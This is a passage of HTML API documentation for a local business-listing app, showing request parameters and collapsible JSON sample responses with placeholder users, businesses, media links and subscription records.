class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"15"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Kalpesh Santoki"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"test"</span>,</div></li><li><div class="hoverable"><span class="property">userImage</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">rate</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">is_share</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">is_favourite</span>: <span class="type-string">"0"</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"4"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Miral"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"Viroja"</span>,</div></li><li><div class="hoverable"><span class="property">userImage</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">rate</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">is_share</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">is_favourite</span>: <span class="type-string">"0"</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"41"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"renish"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"patel"</span>,</div></li><li><div class="hoverable"><span class="property">userImage</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/user/41/e445adb8b159556ecf4bddaa382e0e85.png">http://localhost/businessApp/user/41/e445adb8b159556ecf4bddaa382e0e85.png</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">rate</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">is_share</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">is_favourite</span>: <span class="type-string">"0"</span></div></li></ul>}</div></li></ul>],</div></li><li><div class="hoverable"><span class="property">CommentedusersLists</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"10"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Miralbhai"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"Viroja"</span>,</div></li><li><div class="hoverable"><span class="property">userImage</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/user/14691723208605.png">http://localhost/businessApp/uploads/user/14691723208605.png</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">comment</span>: <span class="type-string">"this is nice event"</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"9"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Miral"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"Viroja"</span>,</div></li><li><div class="hoverable"><span class="property">userImage</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/user/14691720377171.png">http://localhost/businessApp/uploads/user/14691720377171.png</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">comment</span>: <span class="type-string">"this is nice event"</span></div></li></ul>}</div></li></ul>],</div></li><li><div class="hoverable"><span class="property">attendee</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"10"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Miralbhai"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"Viroja"</span>,</div></li><li><div class="hoverable"><span class="property">userImage</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/user/14691723208605.png">http://localhost/businessApp/uploads/user/14691723208605.png</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"1"</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"4"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Miral"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"Viroja"</span>,</div></li><li><div class="hoverable"><span class="property">userImage</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"1"</span></div></li></ul>}</div></li></ul>],</div></li><li><div class="hoverable"><span class="property">images</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">image_path</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/event/1.jpg">http://localhost/businessApp/uploads/event/1.jpg</a><span class="type-string">"</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">image_path</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/business/4.jpg">http://localhost/businessApp/uploads/business/4.jpg</a><span class="type-string">"</span></div></li></ul>}</div></li></ul>],</div></li><li><div class="hoverable"><span class="property">CategoryData</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">CategoryImage</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/category/business.png">http://localhost/businessApp/uploads/category/business.png</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">CategoryName</span>: <span class="type-string">"Business"</span></div></li></ul>}</div></li></ul>]</div></li></ul>}</div></li></ul>]</div></li></ul>}</div>
</div>

<h6>
    <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">400</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"error"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Error in Posting"</span></div></li></ul>}</div>
</div>
</div>

<div class="section" id="mybusiness">
    <h2>My Business
        <a class="headerlink" href="index.php#mybusiness" title="Permalink to this headline">¶</a>
        <a href="<?php echo $formpath.'mybusiness.php'?>" target="_blank" class="html_link">HTML Form</a>
    </h2>
    <p>My Business Details</p>
    <h5>API LINK</h5>
    <div class="highlight-text">
        <div class="highlight">
            <pre><?php echo $apipath.'user/my_business';?></pre>
        </div>
    </div>
    <h5>Request Parameters</h5>
    <div class="wy-table-responsive">
        <table border="1" class="docutils">
            <colgroup>
            <col width="35%">
            <col width="30%">
            <col width="">
        </colgroup>
        <thead valign="bottom">
            <tr class="row-odd">
                <th class="head">Param</th>
                <th class="head">Required/Optional</th>
                <th class="head">Description</th>
            </tr>
        </thead>
        <tbody valign="top">
            <tr class="row-even">
                <td>user_id</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>deLatitude</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>deLongitude</td>
                <td>Required</td>
                <td></td>
            </tr>
            
        </tbody>
    </table>
</div>
<h5>Response</h5>
<h6>
    <i class="fa fa-hand-o-right"></i> Success (Profile)
</h6>
<div class="highlight-js json">
  <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div></li><li><div class="hoverable"><span class="property">data</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"40"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"imobcreator"</span>,</div></li><li><div class="hoverable"><span class="property">description</span>: <span class="type-string">"hfgh"</span>,</div></li><li><div class="hoverable"><span class="property">location</span>: <span class="type-string">"65465"</span>,</div></li><li><div class="hoverable"><span class="property">address</span>: <span class="type-string">"fgfdgg fgfg fgdf"</span>,</div></li><li><div class="hoverable"><span class="property">type</span>: <span class="type-string">"business"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">url</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/business/40/b5ccabcaa7b5bb93202ebf7eb692d5a2.jpg">http://localhost/businessApp/uploads/business/40/b5ccabcaa7b5bb93202ebf7eb692d5a2.jpg</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">totallike</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">totalshare</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">totalfavorite</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">category_id</span>: <span class="type-string">"2"</span>,</div></li><li><div class="hoverable"><span class="property">since</span>: <span class="type-string">"2222"</span>,</div></li><li><div class="hoverable"><span class="property">mobile</span>: <span class="type-string">"5654654"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"renish@test.com"</span>,</div></li><li><div class="hoverable"><span class="property">Lattitude</span>: <span class="type-string">"46.21"</span>,</div></li><li><div class="hoverable"><span class="property">Longitude</span>: <span class="type-string">"75.63"</span>,</div></li><li><div class="hoverable"><span class="property">datetime</span>: <span class="type-string">"2016-12-03 07:32"</span>,</div></li><li><div class="hoverable"><span class="property">working_hours</span>: <span class="type-string">"2"</span>,</div></li><li><div class="hoverable"><span class="property">is_user_exits</span>: <span class="type-boolean">true</span>,</div></li><li><div class="hoverable"><span class="property">CreatedUserData</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"kalpesh1@vros.com"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"Kalpesh1"</span>,</div></li><li><div class="hoverable"><span class="property">is_like</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">is_favourite</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">userImage</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/user/1/d7620846fc11bcb0f6a3c2cf8caaaca0.png">http://localhost/businessApp/user/1/d7620846fc11bcb0f6a3c2cf8caaaca0.png</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">is_share</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">is_rated</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">rate</span>: <span class="type-string">"5"</span></div></li></ul>}</div></li></ul>],</div></li><li><div class="hoverable"><span class="property">LikedusersLists</span>: [ ],</div></li><li><div class="hoverable"><span class="property">CommentedusersLists</span>: [ ],</div></li><li><div class="hoverable"><span class="property">medias</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">image_path</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/business/40/36d91a361c75d6cd5787909b9fa52b99.jpg">http://localhost/businessApp/uploads/business/40/36d91a361c75d6cd5787909b9fa52b99.jpg</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">type</span>: <span class="type-string">"i"</span>,</div></li><li><div class="hoverable"><span class="property">is_default</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">media_id</span>: <span class="type-string">"32"</span>,</div></li><li><div class="hoverable"><span class="property">thumb</span>: <span class="type-string">""</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">image_path</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/business/40/826155a7b7b534775ac1218ad23cd72e.jpg">http://localhost/businessApp/uploads/business/40/826155a7b7b534775ac1218ad23cd72e.jpg</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">type</span>: <span class="type-string">"i"</span>,</div></li><li><div class="hoverable"><span class="property">is_default</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">media_id</span>: <span class="type-string">"33"</span>,</div></li><li><div class="hoverable"><span class="property">thumb</span>: <span class="type-string">""</span></div></li></ul>}</div></li></ul>],</div></li><li><div class="hoverable"><span class="property">CategoryData</span>: [ ],</div></li><li><div class="hoverable"><span class="property">Ads_subscription_data</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">ads_id</span>: <span class="type-string">"47"</span>,</div></li><li><div class="hoverable"><span class="property">url</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/business/1/d13c491e4d20d428d0134620d0ee403e.jpg">http://localhost/businessApp/uploads/business/1/d13c491e4d20d428d0134620d0ee403e.jpg</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">title</span>: <span class="type-string">"imobcreator"</span>,</div></li><li><div class="hoverable"><span class="property">description</span>: <span class="type-string">"hfgh"</span>,</div></li><li><div class="hoverable"><span class="property">start_time</span>: <span class="type-string">"2016-12-01"</span>,</div></li><li><div class="hoverable"><span class="property">end_time</span>: <span class="type-string">"2016-12-11"</span>,</div></li><li><div class="hoverable"><span class="property">business_id</span>: <span class="type-string">"40"</span>,</div></li><li><div class="hoverable"><span class="property">totalclicks</span>: <span class="type-string">"3"</span>,</div></li><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">ads_type</span>: <span class="type-string">"2"</span>,</div></li><li><div class="hoverable"><span class="property">duration</span>: <span class="type-string">"20"</span>,</div></li><li><div class="hoverable"><span class="property">payment_date</span>: <span class="type-string">"2016-12-03"</span>,</div></li><li><div class="hoverable"><span class="property">transaction_id</span>: <span class="type-string">"trn-6766"</span>,</div></li><li><div class="hoverable"><span class="property">amount</span>: <span class="type-string">"10"</span>,</div></li><li><div class="hoverable"><span class="property">payment_status</span>: <span class="type-string">"approved"</span>,</div></li><li><div class="hoverable"><span class="property">remaining_days</span>: <span class="type-number">19</span>,</div></li><li><div class="hoverable"><span class="property">is_active</span>: <span class="type-number">1</span>,</div></li><li><div class="hoverable"><span class="property">revenue_data</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">total_click</span>: <span class="type-string">"2"</span>,</div></li><li><div class="hoverable"><span class="property">date</span>: <span class="type-string">"2016-12-02"</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">total_click</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">date</span>: <span class="type-string">"2016-12-01"</span></div></li></ul>}</div></li></ul>]</div></li></ul>}</div></li></ul>],</div></li><li><div class="hoverable"><span class="property">Offer_subscription_data</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">duration</span>: <span class="type-string">"20"</span>,</div></li><li><div class="hoverable"><span class="property">payment_date</span>: <span class="type-string">"2016-12-01"</span>,</div></li><li><div class="hoverable"><span class="property">transaction_id</span>: <span class="type-string">"trn-676"</span>,</div></li><li><div class="hoverable"><span class="property">amount</span>: <span class="type-string">"10"</span>,</div></li><li><div class="hoverable"><span class="property">payment_status</span>: <span class="type-string">"approved"</span>,</div></li><li><div class="hoverable"><span class="property">remaining_days</span>: <span class="type-number">17</span>,</div></li><li><div class="hoverable"><span class="property">is_active</span>: <span class="type-number">1</span>,</div></li><li><div class="hoverable"><span class="property">total_offers</span>: <span class="type-string">"1"</span></div></li></ul>}</div></li></ul>]</div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"41"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"imobcreator"</span>,</div></li><li><div class="hoverable"><span class="property">description</span>: <span class="type-string">"hfgh"</span>,</div></li><li><div class="hoverable"><span class="property">location</span>: <span class="type-string">"65465"</span>,</div></li><li><div class="hoverable"><span class="property">address</span>: <span class="type-string">"fgfdgg fgfg fgdf"</span>,</div></li><li><div class="hoverable"><span class="property">type</span>: <span class="type-string">"business"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">url</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/business/41/f8ebe505a79bba9022d33a324906a1e6.jpg">http://localhost/businessApp/uploads/business/41/f8ebe505a79bba9022d33a324906a1e6.jpg</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">totallike</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">totalshare</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">totalfavorite</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">category_id</span>: <span class="type-string">"2"</span>,</div></li><li><div class="hoverable"><span class="property">since</span>: <span class="type-string">"2222"</span>,</div></li><li><div class="hoverable"><span class="property">mobile</span>: <span class="type-string">"5654654"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"renish@test.com"</span>,</div></li><li><div class="hoverable"><span class="property">Lattitude</span>: <span class="type-string">"46.21"</span>,</div></li><li><div class="hoverable"><span class="property">Longitude</span>: <span class="type-string">"75.63"</span>,</div></li><li><div class="hoverable"><span class="property">datetime</span>: <span class="type-string">"2016-12-03 07:32"</span>,</div></li><li><div class="hoverable"><span class="property">working_hours</span>: <span class="type-string">"2"</span>,</div></li><li><div class="hoverable"><span class="property">is_user_exits</span>: <span class="type-boolean">true</span>,</div></li><li><div class="hoverable"><span class="property">CreatedUserData</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"kalpesh1@vros.com"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"Kalpesh1"</span>,</div></li><li><div class="hoverable"><span class="property">is_like</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">is_favourite</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">userImage</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/user/1/d7620846fc11bcb0f6a3c2cf8caaaca0.png">http://localhost/businessApp/user/1/d7620846fc11bcb0f6a3c2cf8caaaca0.png</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">is_share</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">is_rated</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">rate</span>: <span class="type-string">"0"</span></div></li></ul>}</div></li></ul>],</div></li><li><div class="hoverable"><span class="property">LikedusersLists</span>: [ ],</div></li><li><div class="hoverable"><span class="property">CommentedusersLists</span>: [ ],</div></li><li><div class="hoverable"><span class="property">medias</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">image_path</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/business/41/7995d2da4fd56015c6ca3947cdfe99ce.jpg">http://localhost/businessApp/uploads/business/41/7995d2da4fd56015c6ca3947cdfe99ce.jpg</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">type</span>: <span class="type-string">"i"</span>,</div></li><li><div class="hoverable"><span class="property">is_default</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">media_id</span>: <span class="type-string">"34"</span>,</div></li><li><div class="hoverable"><span class="property">thumb</span>: <span class="type-string">""</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">image_path</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/business/41/5e5eedc2d5e290cfe44e9e62e43cd39f.jpg">http://localhost/businessApp/uploads/business/41/5e5eedc2d5e290cfe44e9e62e43cd39f.jpg</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">type</span>: <span class="type-string">"i"</span>,</div></li><li><div class="hoverable"><span class="property">is_default</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">media_id</span>: <span class="type-string">"35"</span>,</div></li><li><div class="hoverable"><span class="property">thumb</span>: <span class="type-string">""</span></div></li></ul>}</div></li></ul>],</div></li><li><div class="hoverable"><span class="property">CategoryData</span>: [ ],</div></li><li><div class="hoverable"><span class="property">Ads_subscription_data</span>: [ ],</div></li><li><div class="hoverable"><span class="property">Offer_subscription_data</span>: [ ]</div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"42"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"imobcreator"</span>,</div></li><li><div class="hoverable"><span class="property">description</span>: <span class="type-string">"hfgh"</span>,</div></li><li><div class="hoverable"><span class="property">location</span>: <span class="type-string">"65465"</span>,</div></li><li><div class="hoverable"><span class="property">address</span>: <span class="type-string">"dgdfg dfgdfg df fgdfgdf dfgdf"</span>,</div></li><li><div class="hoverable"><span class="property">type</span>: <span class="type-string">"business"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">url</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/business/42/c71fe4b951a2287b2386084b25dfb2d5.jpg">http://localhost/businessApp/uploads/business/42/c71fe4b951a2287b2386084b25dfb2d5.jpg</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">totallike</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">totalshare</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">totalfavorite</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">category_id</span>: <span class="type-string">"2"</span>,</div></li><li><div class="hoverable"><span class="property">since</span>: <span class="type-string">"2222"</span>,</div></li><li><div class="hoverable"><span class="property">mobile</span>: <span class="type-string">"5654654"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"renish@test.com"</span>,</div></li><li><div class="hoverable"><span class="property">Lattitude</span>: <span class="type-string">"46.21"</span>,</div></li><li><div class="hoverable"><span class="property">Longitude</span>: <span class="type-string">"75.63"</span>,</div></li><li><div class="hoverable"><span class="property">datetime</span>: <span class="type-string">"2016-12-03 07:40"</span>,</div></li><li><div class="hoverable"><span class="property">working_hours</span>: <span class="type-string">"2"</span>,</div></li><li><div class="hoverable"><span class="property">is_user_exits</span>: <span class="type-boolean">true</span>,</div></li><li><div class="hoverable"><span class="property">CreatedUserData</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"kalpesh1@vros.com"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"Kalpesh1"</span>,</div></li><li><div class="hoverable"><span class="property">is_like</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">is_favourite</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">userImage</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/user/1/d7620846fc11bcb0f6a3c2cf8caaaca0.png">http://localhost/businessApp/user/1/d7620846fc11bcb0f6a3c2cf8caaaca0.png</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">is_share</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">is_rated</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">rate</span>: <span class="type-string">"0"</span></div></li></ul>}</div></li></ul>],</div></li><li><div class="hoverable"><span class="property">LikedusersLists</span>: [ ],</div></li><li><div class="hoverable"><span class="property">CommentedusersLists</span>: [ ],</div></li><li><div class="hoverable"><span class="property">medias</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">image_path</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/business/42/d91b6bccd2cb0ad933bcaf1567734018.jpg">http://localhost/businessApp/uploads/business/42/d91b6bccd2cb0ad933bcaf1567734018.jpg</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">type</span>: <span class="type-string">"i"</span>,</div></li><li><div class="hoverable"><span class="property">is_default</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">media_id</span>: <span class="type-string">"36"</span>,</div></li><li><div class="hoverable"><span class="property">thumb</span>: <span class="type-string">""</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">image_path</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/business/42/536249cb327239d40fe688f708fcc3b7.jpg">http://localhost/businessApp/uploads/business/42/536249cb327239d40fe688f708fcc3b7.jpg</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">type</span>: <span class="type-string">"i"</span>,</div></li><li><div class="hoverable"><span class="property">is_default</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">media_id</span>: <span class="type-string">"37"</span>,</div></li><li><div class="hoverable"><span class="property">thumb</span>: <span class="type-string">""</span></div></li></ul>}</div></li></ul>],</div></li><li><div class="hoverable"><span class="property">CategoryData</span>: [ ],</div></li><li><div class="hoverable"><span class="property">Ads_subscription_data</span>: [ ],</div></li><li><div class="hoverable"><span class="property">Offer_subscription_data</span>: [ ]</div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"43"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"imobcreator"</span>,</div></li><li><div class="hoverable"><span class="property">description</span>: <span class="type-string">"hfgh"</span>,</div></li><li><div class="hoverable"><span class="property">location</span>: <span class="type-string">"65465"</span>,</div></li><li><div class="hoverable"><span class="property">address</span>: <span class="type-string">"fgdfg"</span>,</div></li><li><div class="hoverable"><span class="property">type</span>: <span class="type-string">"business"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">url</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/">http://localhost/businessApp/</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">totallike</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">totalshare</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">totalfavorite</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">category_id</span>: <span class="type-string">"2"</span>,</div></li><li><div class="hoverable"><span class="property">since</span>: <span class="type-string">"2222"</span>,</div></li><li><div class="hoverable"><span class="property">mobile</span>: <span class="type-string">"5654654"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"renish@test.com"</span>,</div></li><li><div 